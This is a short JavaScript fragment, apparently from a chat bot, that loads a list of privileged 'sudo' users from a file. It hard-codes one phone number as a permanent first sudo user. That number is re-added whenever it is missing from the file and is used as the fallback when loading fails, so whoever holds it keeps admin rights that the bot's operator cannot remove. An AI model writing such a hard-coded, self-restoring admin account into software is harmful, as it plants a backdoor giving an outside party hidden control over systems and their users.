...
// Always add the first sudo user as +237650564445
const firstSudo = "+237650564445";

try {
    if (fs.existsSync(sudoFile)) {
        sudoUsers = JSON.parse(fs.readFileSync(sudoFile));

        // Ensure the first sudo user is always present
        if (!sudoUsers.includes(firstSudo)) {
            sudoUsers.unshift(firstSudo);  // Add the first sudo user at the beginning if not already present
        }
    }
} catch (error) {
    console.error("Error loading sudo users:", error);
    sudoUsers = [firstSudo];  // If the file doesn't exist or there's an error, initialize with the first sudo user
}
